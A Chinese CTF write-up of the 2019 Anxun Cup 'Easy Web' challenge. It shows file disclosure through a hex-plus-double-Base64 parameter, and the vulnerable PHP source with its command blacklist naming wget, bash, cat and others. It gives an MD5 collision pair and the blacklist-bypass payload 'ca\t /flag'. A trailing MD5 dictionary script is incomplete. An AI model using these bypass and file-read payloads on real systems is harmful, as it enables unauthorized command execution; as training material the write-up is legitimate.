---
title: Easy Web
subtitle: 2019安洵杯
date: 2023-10-29T18:25:17+08:00
slug: e69dffe
tags:
  - MD5
categories:
  - CTF
---

<font size=1>一个比较有趣的题目</font>

打开抓包的时候那个`cmd=`过于耀眼，所以尝试了`cmd=dir`，不过都没有什么，结果倒是多打了一个`;`得到forbid的响应。旁边响应还有一个耀眼的`base64`。后面那串应该就是Base64编码过的。

  

<!--more-->

  

# base64&hex

  

```http

GET /index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd= HTTP/1.1

```

  

进行那段看似乱码的字符串的解码。一个个尝试下了，base64

`TXpVek5UTTFNbVUzTURabE5qYz0`->`MzUzNTM1MmU3MDZlNjc=`->`3535352e706e67`

再通过HEX解码得到`555.png`。

  

访问该图片，发现就是那个熊猫哭泣图。

所以回到之前那个Base64编码过的很长的“乱码”——就是这个图片的内容。

  

可能存在文件包含漏洞。

按照找个`555.png`的编码模式对`index.php`进行编码，也就是先HEX再两次Base64。不过翻到官方文档使用了python进行编码，觉得很有意思：

  

```python

import binascii

import base64

filename = input().encode(encoding='utf-8')

hex = binascii.b2a_hex(filename)

base1 = base64.b64encode(hex)

base2 = base64.b64encode(base1)

print(base2.decode())

```

  

编码结果为`TmprMlpUWTBOalUzT0RKbE56QTJPRGN3`,再次发送，就会得到`index.php`内容经过base64编码后的内容，解码一下就行了

  

-----

-----

  

# Crack form MD5

  

```php

//index.php

<?php

error_reporting(E_ALL || ~ E_NOTICE);//将所有错误和警告都输出，忽略NOTICE级别错误。

header('content-type:text/html;charset=utf-8');

$cmd = $_GET['cmd'];

if (!isset($_GET['img']) || !isset($_GET['cmd']))//检查是否存在img和cmd参数

    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');//不存在就重定向到该页面

$file = hex2bin(base64_decode(base64_decode($_GET['img'])));//将img参数进行编/解码后存储到$file中

  

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);//通过正则将文件中非字母、数字字符全部替换为空

if (preg_match("/flag/i", $file)) {

    echo '<img src ="./ctf3.jpeg">';

    die("xixi～ no flag");

} else {

    $txt = base64_encode(file_get_contents($file));//否则进行输出

    echo "<img src='data:image/gif;base64," . $txt . "'></img>";

    echo "<br>";

}

echo $cmd;

echo "<br>";

//通过正则进行black list检查

if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {

    echo("forbid ~");

    echo "<br>";

} else {

    //否则进行MD5碰撞：首先比较POST请求中的a和b参数是否相等，然后比较它们的MD5哈希值是否相等。如果两个条件都满足，则执行$cmd命令，并输出结果；否则输出"md5 is funny ~"。

    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {

        echo `$cmd`;

    } else {

        echo ("md5 is funny ~");

    }

}

```

看完其实可以得知的是，要用POST传参

  

## first problem: MD5碰撞

  

参考这个——<a href=https://www.jianshu.com/p/c9089fd5b1ba>MD5碰撞的一些例子</a>

进行URL编码

```

a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2

&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2

```

  

## second problem: 绕过黑名单

  
  
  

>dir 命令最基本的用途是列出当前目录的内容，最简单的使用方式是不带任何参数和选项，直接键入 dir，然后回车，默认就会列出当前目录中的内容

  

`dir%20`

```

555.png  bj.png  ctf3.jpeg  index.php

```

----

  

>/表示目录，没有特别指明则输出所有目录名

  

`dir%20/`

  

```

bin   dev  flag  lib    media  opt   root  sbin  sys  usr

boot  etc  home  lib64  mnt    proc  run   srv   tmp  var

```

----

  

>cat（英文全拼：concatenate）命令用于连接文件并打印到标准输出设备上。

  

`ca\t%20/flag`

得到flag

  

------

  

# ファンワイ

  

<a href=https://github.com/iamjazz/Md5collision>MD5碰撞生成生成器</a>

  

```python

//MD5碰撞生成字典

class batch_Md5():

    def one_md5_encode(self, string):

        md5_data = hashlib.md5()

        md5_data.update(string.encode("utf-8"))

        print(string +" ===> "+md5_data.hexdigest())

  

    def batch_md5_encode(self, file, outfile):

        for strtmp in file:

            strtmp = strtmp.replace("\n", "")

            time.sleep(1)

            try:

                md5_data = hashlib.md5()

                md5_data.update(str(strtmp).encode("utf-8"))

                res = md5_data.hexdigest()

                with open(outfile, "a") as fw:

                    fw.writelines(str(res) + "\n")

                print(strtmp +" ===> "+res)

            except Exception as e:

                print("md5加密超时！")

        return res

  

if(__name__ == "__main__"):

    title()

    parser = argparse.ArgumentParser(description="Made md5 Dicts Script")

    parser.add_argument(

        '-s', '--string', type=str, metavar="",

        help='Please input strings to md5 encode. eg: afei'

    )

    parser.add_argument(

        '-f', '--file', type=argparse.FileType('r'), metavar="",

        help='Please input file path for batch encode. eg: c:/str.txt'

    )

    parser.add_argument(

        '-o', '--outfile', metavar="",

        help="Please input path for output file. eg：c:/output.txt"

    )

    args = parser.parse_args()

    run = batch_Md5()

    if args.string:

        run.one_md5_encode(args.string)

        exit()

    if args.file:

        run.batch_md5_encode(args.file, args.outfile)

    else:

        print("请输入-h选项查看用法！")

```
